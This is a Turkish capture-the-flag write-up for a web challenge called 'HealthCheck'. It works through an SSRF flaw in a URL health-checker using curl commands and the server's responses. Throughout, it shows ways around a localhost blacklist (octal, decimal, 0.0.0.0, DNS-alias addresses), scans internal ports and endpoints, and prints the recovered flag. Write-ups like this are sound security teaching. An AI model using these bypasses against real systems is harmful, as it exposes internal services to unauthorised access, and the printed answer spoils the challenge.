# 🎯 HealthCheck - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-SSRF-purple?style=for-the-badge" alt="SSRF">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500  

**Challenge URL:** http://64.226.74.243:2003/

---

## 🔍 Analiz

**Hedef:** SSRF (Server-Side Request Forgery) açığından yararlanarak internal servislere erişmek ve flag'i bulmak

**Strateji:** Sayfa analizi → SSRF tespiti → Blacklist bypass → Internal endpoint keşfi → Flag

**İpuçları:**
- 🔍 "URL Health Checker" → Server-side request yapıyor
- 🚫 "Blacklist" → Localhost erişimi engellenmiş olabilir
- 🔓 "Internal servislere erişim" → SSRF zafiyeti
- 💡 Orta seviye → Bypass teknikleri gerekli

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: Hedef Sayfayı İnceleme**

**Siteye curl ile bağlanıyoruz:**

```bash
curl -v http://64.226.74.243:2003/
```

**Response:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>URL Health Checker</title>
</head>
<body>
    <div class="container">
        <h1>🔍 URL Health Checker</h1>
        <p>Check if a website is up and running!</p>
        
        <form action="/check" method="GET">
            <input type="text" name="url" placeholder="https://example.com" required>
            <button type="submit">Check URL</button>
        </form>
    </div>
</body>
</html>
```

**Server Header:**
```
Server: Werkzeug/3.1.5 Python/3.11.14
```

**Analiz:**
- ✅ URL checker servisi
- ✅ GET method ile `/check` endpoint'ine istek
- ✅ `url` parametresi alıyor
- ✅ Flask/Werkzeug (Python) kullanıyor
- 💡 Server-side request yapıyor → SSRF olabilir

---

### 🔎 **Adım 2: Normal URL Testi**

**Google.com ile test ediyoruz:**

```bash
curl "http://64.226.74.243:2003/check?url=https://google.com"
```

**Response:**

```html
<div class="result ">
    <strong>Result:</strong><br>
    <strong>Status Code:</strong> 301<br>
    <strong>Response Preview:</strong><br>
    <pre>
<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
<TITLE>301 Moved</TITLE></HEAD><BODY>
<H1>301 Moved</H1>
The document has moved
<A HREF="https://www.google.com/">here</A>.
</BODY></HTML>
    </pre>
</div>
```

**✅ URL CHECKER ÇALIŞIYOR!**

**Analiz:**
- ✅ Server harici URL'lere istek yapabiliyor
- ✅ Response içeriğini gösteriyor
- ✅ Status code'u döndürüyor
- 💡 SSRF için mükemmel bir target

---

### 🚫 **Adım 3: Localhost Erişim Testi**

**127.0.0.1'e erişmeyi deniyoruz:**

```bash
curl "http://64.226.74.243:2003/check?url=http://127.0.0.1"
```

**Response:**

```html
<div class="result error">
    <strong>Result:</strong><br>
    Blocked! Suspicious URL detected.
</div>
```

**❌ LOCALHOST ENGELLENDİ!**

**Analiz:**
- ❌ `127.0.0.1` blacklist'te
- ⚠️ "Suspicious URL detected" → Filtreleme var
- 💡 Bypass teknikleri gerekli

---

### 🔓 **Adım 4: SSRF Blacklist Bypass Teknikleri**

**Farklı localhost notasyonları deniyoruz:**

**Test 1 - localhost:**
```bash
curl "http://64.226.74.243:2003/check?url=http://localhost"
```

**Response:**
```
Blocked! Suspicious URL detected.
```
**❌ ENGELLENDİ**

---

**Test 2 - 0.0.0.0:**
```bash
curl "http://64.226.74.243:2003/check?url=http://0.0.0.0"
```

**Response:**
```html
<div class="result ">
    <strong>Result:</strong><br>
    <strong>Status Code:</strong> 200<br>
    <strong>Response Preview:</strong><br>
    <pre>
<!DOCTYPE html>
<html>
<head>
    <title>URL Health Checker</title>
...
    </pre>
</div>
```

**✅ 0.0.0.0 ÇALIŞTI!**

---

**Test 3 - IPv6 [::1]:**
```bash
curl "http://64.226.74.243:2003/check?url=http://[::1]"
```

**Response:**
```
Error: HTTPConnectionPool(host='::1', port=80): ... Connection refused
```
**⚠️ IPv6 çalıştı ama port 80 kapalı**

---

**Test 4 - Octal notation (0177.0.0.1):**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1"
```

**Response:**
```html
<div class="result ">
    <strong>Result:</strong><br>
    <strong>Status Code:</strong> 200<br>
    <strong>Response Preview:</strong><br>
    <pre>
<!DOCTYPE html>
<html>
<head>
    <title>URL Health Checker</title>
...
    </pre>
</div>
```

**✅ OCTAL NOTATION ÇALIŞTI!**

---

**Test 5 - Decimal notation (2130706433):**
```bash
curl "http://64.226.74.243:2003/check?url=http://2130706433"
```

**Response:**
```
Status Code: 200
```

**✅ DECIMAL NOTATION ÇALIŞTI!**

---

**Test 6 - DNS alias (localtest.me):**
```bash
curl "http://64.226.74.243:2003/check?url=http://localtest.me"
```

**Response:**
```
Status Code: 200
```

**✅ DNS ALIAS ÇALIŞTI!**

---

**Analiz:**
- ✅ Bypass başarılı! `0177.0.0.1` (Octal) en iyi seçenek
- ✅ Localhost'a erişim sağlandı
- ✅ Şimdi internal servisleri tarayacağız

---

### 🔍 **Adım 5: Internal Port Scanning**

**Farklı portları taramaya başlıyoruz:**

**Port 80:**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:80"
```

**Response:**
```
Status Code: 200
(Kendi sayfası - URL Checker)
```

---

**Port 8080:**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:8080"
```

**Response:**
```
Error: ... Connection refused
```
**❌ KAPALI**

---

**Port 5000:**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:5000"
```

**Response:**
```
Error: ... Connection refused
```
**❌ KAPALI**

---

**Port 3000:**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:3000"
```

**Response:**
```
Error: ... Connection refused
```
**❌ KAPALI**

---

**Analiz:**
- ⚠️ Tüm common portlar kapalı
- 💡 Flag muhtemelen bir endpoint'te (URL path)
- 🎯 Endpoint keşfine geçiyoruz

---

### 🎯 **Adım 6: Internal Endpoint Discovery**

**Common endpoint'leri deniyoruz:**

**Endpoint: /admin**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/admin"
```

**Response:**
```html
<strong>Status Code:</strong> 404<br>
<strong>Response Preview:</strong><br>
<pre>
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
</pre>
```

**❌ 404 NOT FOUND**

---

**Endpoint: /flag**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/flag"
```

**Response:**
```html
<div class="result ">
    <strong>Result:</strong><br>
    <strong>Status Code:</strong> 200<br>
    <strong>Response Preview:</strong><br>
    <pre>flag{ssrfileflagsizdirdintebrikler4300dolarbounty}</pre>
</div>
```

**🎉 FLAG BULUNDU!**

---

**Endpoint: /secret**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/secret"
```

**Response:**
```
Status Code: 404
```

**❌ 404 NOT FOUND**

---

**Endpoint: /internal**
```bash
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/internal"
```

**Response:**
```
Status Code: 404
```

**❌ 404 NOT FOUND**

---

**Analiz:**
- ✅ `/flag` endpoint'i bulundu!
- ✅ Internal endpoint sadece localhost'tan erişilebilir
- ✅ SSRF ile erişim sağlandı

---

## 🚩 **FLAG**

```
flag{ssrfileflagsizdirdintebrikler4300dolarbounty}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP request</sub></td>
<td align="center">🔍<br><b>Browser DevTools</b><br><sub>Network analysis</sub></td>
<td align="center">📝<br><b>IP Converter</b><br><sub>Octal/Decimal conversion</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Sayfa analizi
curl -v http://64.226.74.243:2003/

# Normal URL testi
curl "http://64.226.74.243:2003/check?url=https://google.com"

# Localhost testi (blocked)
curl "http://64.226.74.243:2003/check?url=http://127.0.0.1"

# Bypass teknikleri
curl "http://64.226.74.243:2003/check?url=http://localhost"        # Blocked
curl "http://64.226.74.243:2003/check?url=http://0.0.0.0"          # Success
curl "http://64.226.74.243:2003/check?url=http://[::1]"            # Connection refused
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1"       # Success (Octal)
curl "http://64.226.74.243:2003/check?url=http://2130706433"       # Success (Decimal)
curl "http://64.226.74.243:2003/check?url=http://localtest.me"     # Success

# Port scanning
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:80"
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:8080"
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1:5000"

# Endpoint discovery
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/admin"
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/flag"    # FLAG!
curl "http://64.226.74.243:2003/check?url=http://0177.0.0.1/secret"
```

---

## 💭 **Çözüm Akış Şeması**

```
🎯 HealthCheck SSRF Challenge
            ↓
🌐 Hedef sayfayı incele
   → URL Health Checker servisi
   → /check endpoint'i
            ↓
🔎 Normal URL testi
   → https://google.com
   → ✅ Çalışıyor! (SSRF mümkün)
            ↓
🚫 Localhost erişim testi
   → http://127.0.0.1
   → ❌ Blocked! (Blacklist var)
            ↓
🔓 Blacklist bypass teknikleri
   → localhost → ❌ Blocked
   → 0.0.0.0 → ✅ Çalıştı!
   → [::1] → ⚠️ Connection refused
   → 0177.0.0.1 (Octal) → ✅ Çalıştı!
   → 2130706433 (Decimal) → ✅ Çalıştı!
   → localtest.me → ✅ Çalıştı!
            ↓
🔍 Internal port scanning
   → :80 → Kendi servisi
   → :8080 → Connection refused
   → :5000 → Connection refused
   → :3000 → Connection refused
            ↓
🎯 Endpoint discovery
   → /admin → 404 Not Found
   → /flag → ✅ 200 OK - FLAG!
   → /secret → 404 Not Found
            ↓
🚩 flag{ssrfileflagsizdirdintebrikler4300dolarbounty}
```
